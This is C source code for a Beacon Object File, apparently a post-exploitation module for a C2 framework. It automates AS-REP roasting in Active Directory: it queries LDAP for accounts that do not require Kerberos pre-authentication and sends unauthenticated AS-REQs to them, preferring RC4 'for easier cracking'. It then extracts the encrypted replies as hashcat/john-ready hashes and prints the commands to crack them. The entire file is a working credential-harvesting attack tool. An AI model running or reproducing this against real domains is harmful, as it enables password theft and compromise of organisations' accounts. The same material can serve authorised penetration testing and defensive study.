/*
 * krb_asreproast_auto - Automatic AS-REP Roasting
 *
 * Enumerates all users with "Do not require Kerberos pre-authentication"
 * flag set and automatically obtains AS-REP hashes for offline cracking.
 *
 * Usage: krb_asreproast_auto /dc:DC_IP [/domain:DOMAIN] [/ldapserver:LDAP_SERVER]
 */

#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* LDAP type definitions for BOF */
typedef struct ldap LDAP;
typedef struct ldapmsg LDAPMessage;

/* LDAP BOF imports */
DECLSPEC_IMPORT LDAP* WINAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(LDAP*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_next_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR* WINAPI WLDAP32$ldap_get_valuesW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_freeW(PWSTR*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_set_optionW(LDAP*, int, void*);

/* Missing KERNEL32 imports */
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

/* Missing MSVCRT import */
DECLSPEC_IMPORT char* __cdecl MSVCRT$strtok(char*, const char*);
#define strtok MSVCRT$strtok

/* LDAP constants */
#define LDAP_PORT 389
#define LDAP_SCOPE_SUBTREE 0x02
#define LDAP_OPT_PROTOCOL_VERSION 0x11
#define LDAP_OPT_REFERRALS 0x08
#define LDAP_VERSION3 3
#define LDAP_AUTH_NEGOTIATE 0x0486
#define LDAP_SUCCESS 0

/* userAccountControl flag for "Do not require Kerberos preauthentication" */
#define UF_DONT_REQUIRE_PREAUTH 0x400000

/* Build AS-REQ without pre-authentication for AS-REP roasting */
static void build_asrep_request(KRB_BUFFER* out, const char* domain, const char* username) {
    KRB_BUFFER asreq, pvno, msg_type, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&asreq, 2048);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 256);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);


    kdc_opts[0] = (BYTE)((kdc_options >> 24) & 0xFF);
    kdc_opts[1] = (BYTE)((kdc_options >> 16) & 0xFF);
    kdc_opts[2] = (BYTE)((kdc_options >> 8) & 0xFF);
    kdc_opts[3] = (BYTE)(kdc_options & 0xFF);

    /* kdc-options [0] */
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* cname [1] - client principal */
    KRB_BUFFER cname, cname_type, cname_strings, cname_seq;
    buf_init(&cname, 128);
    buf_init(&cname_type, 16);
    buf_init(&cname_strings, 64);
    buf_init(&cname_seq, 64);

    asn1_encode_integer(&cname_type, KRB5_NT_PRINCIPAL);
    asn1_context_wrap(&cname, 0, &cname_type);
    asn1_encode_general_string(&cname_strings, username);
    asn1_wrap(&cname_seq, ASN1_SEQUENCE, &cname_strings);
    asn1_context_wrap(&cname, 1, &cname_seq);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &cname);
    asn1_context_wrap(&body, 1, &tmp);
    buf_reset(&tmp);

    buf_free(&cname);
    buf_free(&cname_type);
    buf_free(&cname_strings);
    buf_free(&cname_seq);

    /* realm [2] */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* sname [3] - krbtgt/REALM */
    KRB_BUFFER sname, sname_type, sname_strings, sname_seq;
    buf_init(&sname, 128);
    buf_init(&sname_type, 16);
    buf_init(&sname_strings, 128);
    buf_init(&sname_seq, 128);

    asn1_encode_integer(&sname_type, KRB5_NT_SRV_INST);
    asn1_context_wrap(&sname, 0, &sname_type);
    asn1_encode_general_string(&sname_strings, "krbtgt");
    asn1_encode_general_string(&sname_strings, domain);
    asn1_wrap(&sname_seq, ASN1_SEQUENCE, &sname_strings);
    asn1_context_wrap(&sname, 1, &sname_seq);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &sname);
    asn1_context_wrap(&body, 3, &tmp);
    buf_reset(&tmp);

    buf_free(&sname);
    buf_free(&sname_type);
    buf_free(&sname_strings);
    buf_free(&sname_seq);

    /* till [5] */
    asn1_encode_generalized_time(&tmp, "20370913024805Z");
    asn1_context_wrap(&body, 5, &tmp);
    buf_reset(&tmp);

    /* nonce [7] */
    asn1_encode_integer(&tmp, KERNEL32$GetTickCount());
    asn1_context_wrap(&body, 7, &tmp);
    buf_reset(&tmp);

    /* etype [8] - prefer RC4 for easier cracking */
    asn1_encode_integer(&etype_list, ETYPE_RC4_HMAC);
    asn1_encode_integer(&etype_list, ETYPE_AES256_CTS_HMAC_SHA1);
    asn1_encode_integer(&etype_list, ETYPE_AES128_CTS_HMAC_SHA1);
    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);

    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);


    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* No padata [3] - this is key for AS-REP roasting */

    asn1_context_wrap(&asreq, 4, &req_body);


    KRB_BUFFER seq_wrap;
    buf_init(&seq_wrap, asreq.length + 8);
    asn1_wrap(&seq_wrap, ASN1_SEQUENCE, &asreq);

    buf_append_byte(out, ASN1_APP(KRB5_AS_REQ));
    asn1_encode_length(out, seq_wrap.length);
    buf_append(out, seq_wrap.data, seq_wrap.length);

    buf_free(&seq_wrap);
    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Extract hash from AS-REP */
static int extract_hash(const BYTE* data, size_t len, const char* username,
                        const char* domain, formatp* output) {
    size_t offset = 0;

    /* Check for AS-REP (APPLICATION 11) */
    if (data[offset] != ASN1_APP(KRB5_AS_REP)) {
        if (data[offset] == ASN1_APP(KRB5_ERROR)) {
            /* Parse error */
            offset++;
            asn1_decode_length(data, &offset);
            while (offset < len - 10) {
                if (data[offset] == ASN1_CONTEXT(6)) {
                    offset++;
                    asn1_decode_length(data, &offset);
                    if (data[offset] == ASN1_INTEGER) {
                        offset++;
                        size_t int_len = asn1_decode_length(data, &offset);
                        int error_code = 0;
                        for (size_t i = 0; i < int_len && i < 4; i++) {
                            error_code = (error_code << 8) | data[offset + i];
                        }
                        if (error_code == KDC_ERR_PREAUTH_REQUIRED) {
                            BeaconFormatPrintf(output, "    [-] Pre-auth required (false positive)\n");
                        } else if (error_code == KDC_ERR_C_PRINCIPAL_UNKNOWN) {
                            BeaconFormatPrintf(output, "    [-] User not found\n");
                        } else {
                            BeaconFormatPrintf(output, "    [-] KRB-ERROR: %d\n", error_code);
                        }
                        return 0;
                    }
                }
                offset++;
            }
        }
        return 0;
    }

    /* Found AS-REP - extract cipher */
    int etype = 0;
    const BYTE* cipher = NULL;
    size_t cipher_len = 0;

    offset = 1;
    asn1_decode_length(data, &offset);

    if (data[offset] == ASN1_SEQUENCE) {
        offset++;
        asn1_decode_length(data, &offset);
    }

    while (offset < len - 4) {
        BYTE tag = data[offset];
        if ((tag & 0xE0) != 0xA0) break;

        offset++;
        size_t field_len = asn1_decode_length(data, &offset);
        size_t field_start = offset;

        /* enc-part is [6] */
        if (tag == ASN1_CONTEXT(6)) {
            if (data[offset] == ASN1_SEQUENCE) {
                offset++;
                asn1_decode_length(data, &offset);

                while (offset < field_start + field_len) {
                    BYTE enc_tag = data[offset];
                    offset++;
                    size_t enc_len = asn1_decode_length(data, &offset);

                    if (enc_tag == ASN1_CONTEXT(0)) {
                        if (data[offset] == ASN1_INTEGER) {
                            offset++;
                            size_t int_len = asn1_decode_length(data, &offset);
                            for (size_t i = 0; i < int_len; i++) {
                                etype = (etype << 8) | data[offset + i];
                            }
                            offset += int_len;
                        } else {
                            offset += enc_len;
                        }
                    } else if (enc_tag == ASN1_CONTEXT(2)) {
                        if (data[offset] == ASN1_OCTETSTRING) {
                            offset++;
                            cipher_len = asn1_decode_length(data, &offset);
                            cipher = data + offset;
                            offset += cipher_len;
                        } else {
                            offset += enc_len;
                        }
                    } else {
                        offset += enc_len;
                    }
                }
            }
            break;
        }
        offset = field_start + field_len;
    }

    if (cipher && cipher_len > 0) {
        /* Format hash for hashcat/john */
        if (etype == ETYPE_RC4_HMAC && cipher_len > 16) {
            char checksum_b64[64];
            char* edata_b64 = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(),
                                                         HEAP_ZERO_MEMORY, cipher_len * 2);
            if (edata_b64) {
                base64_encode(cipher, 16, checksum_b64);
                base64_encode(cipher + 16, cipher_len - 16, edata_b64);

                BeaconFormatPrintf(output, "    [+] Hash (hashcat -m 18200):\n");
                BeaconFormatPrintf(output, "$krb5asrep$%d$%s@%s:%s$%s\n\n",
                                   etype, username, domain, checksum_b64, edata_b64);

                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, edata_b64);
            }
        } else {
            /* AES or other */
            char* cipher_b64 = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(),
                                                          HEAP_ZERO_MEMORY, cipher_len * 2);
            if (cipher_b64) {
                base64_encode(cipher, cipher_len, cipher_b64);
                BeaconFormatPrintf(output, "    [+] Hash (etype %d):\n", etype);
                BeaconFormatPrintf(output, "$krb5asrep$%d$%s@%s:%s\n\n",
                                   etype, username, domain, cipher_b64);
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, cipher_b64);
            }
        }
        return 1;
    }

    BeaconFormatPrintf(output, "    [-] Could not extract cipher\n");
    return 0;
}

/* Roast a single user */
static int roast_user(const char* username, const char* domain, const char* dc, formatp* output) {
    KRB_BUFFER as_req;
    buf_init(&as_req, 2048);
    build_asrep_request(&as_req, domain, username);

    SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(output, "    [-] Failed to connect to KDC\n");
        buf_free(&as_req);
        return 0;
    }

    if (send_krb_msg(sock, as_req.data, as_req.length) <= 0) {
        BeaconFormatPrintf(output, "    [-] Failed to send AS-REQ\n");
        WS2_32$closesocket(sock);
        buf_free(&as_req);
        return 0;
    }

    BYTE* recv_buf = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 16384);
    if (!recv_buf) {
        WS2_32$closesocket(sock);
        buf_free(&as_req);
        return 0;
    }

    int recv_len = recv_krb_msg(sock, recv_buf, 16384);
    WS2_32$closesocket(sock);
    buf_free(&as_req);

    int result = 0;
    if (recv_len > 4) {
        result = extract_hash(recv_buf + 4, recv_len - 4, username, domain, output);
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, recv_buf);
    return result;
}

/* Convert wide string to narrow */
static char* wchar_to_char(WCHAR* wstr) {
    int len = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    char* str = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (str) {
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
    }
    return str;
}

/* Convert narrow string to wide */
static WCHAR* char_to_wchar(const char* str) {
    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    WCHAR* wstr = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (len + 1) * sizeof(WCHAR));
    if (wstr) {
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    }
    return wstr;
}

/* Get domain DN from domain name */
static WCHAR* domain_to_dn(const char* domain) {
    /* Convert DOMAIN.COM to DC=DOMAIN,DC=COM */
    static WCHAR dn[512];
    char* dom_copy = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(domain) + 1);
    if (!dom_copy) return NULL;
    strcpy(dom_copy, domain);

    WCHAR* out = dn;
    char* token = strtok(dom_copy, ".");
    int first = 1;

    while (token) {
        if (!first) {
            *out++ = L',';
        }
        *out++ = L'D';
        *out++ = L'C';
        *out++ = L'=';
        while (*token) {
            *out++ = (WCHAR)*token++;
        }
        first = 0;
        token = strtok(NULL, ".");
    }
    *out = L'\0';

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dom_copy);
    return dn;
}


void go(char* args, int alen) {
    WSADATA wsaData;
    formatp output;
    ARG_PARSER parser;
    LDAP* ld = NULL;

    BeaconFormatAlloc(&output, 128 * 1024);
    arg_init(&parser, args, alen);

    char* dc = arg_get(&parser, "dc");
    char* domain = arg_get(&parser, "domain");
    char* ldapserver = arg_get(&parser, "ldapserver");

    if (!dc) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_asreproast_auto /dc:DC_IP [/domain:DOMAIN] [/ldapserver:LDAP_SERVER]");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconPrintf(CALLBACK_ERROR, "Could not determine domain. Specify /domain:");
            goto cleanup;
        }
    }


    char* domain_upper = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(domain) + 1);
    strcpy(domain_upper, domain);
    strupr(domain_upper);

    BeaconFormatPrintf(&output, "[*] Action: Automatic AS-REP Roasting\n");
    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain_upper);
    BeaconFormatPrintf(&output, "[*] KDC: %s\n", dc);


    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed");
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain_upper);
        goto cleanup;
    }

    /* Connect to LDAP */
    WCHAR* ldap_server = NULL;
    if (ldapserver) {
        ldap_server = char_to_wchar(ldapserver);
    } else {
        ldap_server = char_to_wchar(dc);
    }

    BeaconFormatPrintf(&output, "[*] LDAP Server: %S\n\n", ldap_server);

    ld = WLDAP32$ldap_initW(ldap_server, LDAP_PORT);
    if (!ld) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LDAP\n");
        WS2_32$WSACleanup();
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain_upper);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ldap_server);
        goto cleanup;
    }

    ULONG version = LDAP_VERSION3;
    WLDAP32$ldap_set_optionW(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

    ULONG referrals = 0;
    WLDAP32$ldap_set_optionW(ld, LDAP_OPT_REFERRALS, &referrals);

    ULONG bindResult = WLDAP32$ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (bindResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(&output, "[-] LDAP bind failed: %d\n", bindResult);
        WLDAP32$ldap_unbind(ld);
        WS2_32$WSACleanup();
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain_upper);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ldap_server);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] LDAP bind successful\n");


    /* Filter: (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) */
    WCHAR filter[] = L"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";

    WCHAR* searchBase = domain_to_dn(domain_upper);
    WCHAR* attrs[] = { L"sAMAccountName", L"userPrincipalName", NULL };

    BeaconFormatPrintf(&output, "[*] Searching for users with DONT_REQUIRE_PREAUTH...\n");
    BeaconFormatPrintf(&output, "[*] Search base: %S\n\n", searchBase);

    LDAPMessage* results = NULL;
    ULONG searchResult = WLDAP32$ldap_search_sW(ld, searchBase, LDAP_SCOPE_SUBTREE,
                                                  filter, attrs, 0, &results);

    if (searchResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(&output, "[-] LDAP search failed: %d\n", searchResult);
        WLDAP32$ldap_unbind(ld);
        WS2_32$WSACleanup();
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain_upper);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ldap_server);
        goto cleanup;
    }


    int user_count = 0;
    int hash_count = 0;
    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, results);

    while (entry) {
        user_count++;

        PWSTR* samValues = WLDAP32$ldap_get_valuesW(ld, entry, L"sAMAccountName");
        if (samValues && samValues[0]) {
            char* username = wchar_to_char(samValues[0]);

            BeaconFormatPrintf(&output, "[*] Found vulnerable user: %s\n", username);
            BeaconFormatPrintf(&output, "    [*] Requesting AS-REP...\n");

            if (roast_user(username, domain_upper, dc, &output)) {
                hash_count++;
            }

            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, username);
            WLDAP32$ldap_value_freeW(samValues);
        }

        entry = WLDAP32$ldap_next_entry(ld, entry);
    }

    WLDAP32$ldap_msgfree(results);
    WLDAP32$ldap_unbind(ld);

    BeaconFormatPrintf(&output, "[*] ========================================\n");
    BeaconFormatPrintf(&output, "[*] AS-REP Roasting Complete\n");
    BeaconFormatPrintf(&output, "[*] Users with DONT_REQUIRE_PREAUTH: %d\n", user_count);
    BeaconFormatPrintf(&output, "[*] Hashes obtained: %d\n", hash_count);
    BeaconFormatPrintf(&output, "[*] ========================================\n\n");

    if (hash_count > 0) {
        BeaconFormatPrintf(&output, "[*] Crack with hashcat:\n");
        BeaconFormatPrintf(&output, "    hashcat -m 18200 hashes.txt wordlist.txt\n\n");
        BeaconFormatPrintf(&output, "[*] Crack with john:\n");
        BeaconFormatPrintf(&output, "    john --format=krb5asrep hashes.txt\n");
    }

    WS2_32$WSACleanup();
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain_upper);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ldap_server);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (dc) free(dc);
    if (domain) free(domain);
    if (ldapserver) free(ldapserver);
}
